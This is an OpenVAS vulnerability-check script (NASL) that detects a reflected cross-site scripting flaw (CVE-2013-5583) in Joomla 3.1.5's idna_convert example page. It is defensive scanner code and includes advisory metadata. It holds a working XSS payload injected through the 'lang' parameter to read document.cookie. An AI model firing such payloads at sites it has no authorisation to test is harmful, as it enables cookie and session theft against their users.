###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_lang_parm_xss_vuln.nasl 34118 2014-01-06 12:53:52Z Jan$
#
# Joomla! 'lang' Parameter Reflected Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804057";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6715 $");
  script_cve_id("CVE-2013-5583");
  script_bugtraq_id(61600);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-13 11:57:40 +0200 (Thu, 13 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-01-06 12:53:52 +0530 (Mon, 06 Jan 2014)");
  script_name("Joomla! 'lang' Parameter Reflected Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Joomla and is prone to cross site scripting
vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via the 'lang' parameter to '/libraries/idna_convert/example.php'
script is not properly sanitized before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"Joomla version 3.1.5 and prior.";

  tag_solution =
"Upgrade to Joomla version 3.1.6 or later,
For updates refer to www.joomla.org";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/54353");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Aug/27");
  script_xref(name : "URL" , value : "https://github.com/joomla/joomla-cms/issues/1658");
  script_xref(name : "URL" , value : "http://disse.cting.org/2013/08/05/joomla-core-3_1_5_reflected-xss-vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
jPort = "";

## Get HTTP Port
jPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!jPort){
  jPort = 80;
}

## Check the port status
if(!get_port_state(jPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:jPort)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:jPort)){
  exit(0);
}

## Construct attack request
url = string(dir, '/libraries/idna_convert/example.php?lang=";>' +
                  '<script>alert(document.cookie);</script><!--');

## Check the response to confirm vulnerability
if(http_vuln_check(port:jPort, url:url, check_header:TRUE,
               pattern:"><script>alert\(document.cookie\);</script>",
               extra_check:">phlyLabs"))
{
  report = report_vuln_url( port:jPort, url:url );
  security_message(port:jPort, data:report);
  exit(0);
}
